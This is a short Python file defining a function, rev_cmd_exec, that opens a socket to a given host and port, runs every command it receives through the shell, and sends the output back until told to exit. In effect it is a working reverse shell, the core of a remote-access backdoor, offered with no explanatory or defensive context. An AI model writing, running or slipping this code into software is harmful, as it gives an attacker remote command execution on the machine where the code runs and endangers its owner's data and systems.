import socket
import subprocess

def rev_cmd_exec(host, port):
    s = socket.socket()
    s.connect((host, port))

    while True:
        try:
            cmd = s.recv(1024).decode().strip()
            if cmd.lower() in ["exit", "quit"]:
                break

            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            output = result.stdout + result.stderr
            if not output:
                output = "[No output]"

            s.sendall(output.encode())
        except Exception as e:
            s.sendall(f"[Error] {str(e)}".encode())
            break

    s.close()
